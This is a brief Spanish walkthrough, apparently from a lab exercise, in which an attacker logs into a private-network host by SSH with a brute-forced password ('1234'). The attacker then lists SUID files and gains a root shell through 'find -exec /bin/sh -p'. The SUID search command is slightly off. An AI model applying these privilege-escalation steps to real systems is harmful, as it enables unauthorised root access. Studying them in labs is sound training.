soy el atacante y conozco la contraseña por un ataque de fuerza bruta me conectare a la maquina victima
ssh operario@172.20.0.10
contraseña: 1234

he ganado acceso al sistema ahora voy en busqueda de archivos con el bit SUID activo

find / -perm 4000 -type f 2> /dev/null

-find

perfecto hay un binario con el SUID activo. me convertire en root utilizandolo

find . -exec /bin/sh -p \; -quit

ahora ejecutare un whoami para saber si soy root

# whoami
root
#

acceso concedido perfecto, ya gane !!!!